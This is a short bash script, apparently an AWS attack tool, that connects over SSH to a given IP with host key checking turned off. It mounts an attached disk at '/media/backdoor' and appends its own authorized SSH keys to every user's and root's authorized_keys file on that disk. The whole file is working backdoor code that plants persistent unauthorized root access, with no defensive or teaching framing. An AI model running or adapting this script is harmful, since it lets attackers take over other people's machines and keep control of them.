#!/bin/bash
ipaddr=$1
echo LOCKED ON TO $ipaddr
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mkdir /media/backdoor"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo mount /dev/xvdx1 /media/backdoor"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo cat /home/ubuntu/.ssh/authorized_keys >> /media/backdoor/home/*/.ssh/authorized_keys"
ssh -i popaws -o StrictHostKeyChecking=no ubuntu@$ipaddr "sudo cat /home/ubuntu/.ssh/authorized_keys >> /media/backdoor/root/.ssh/authorized_keys"
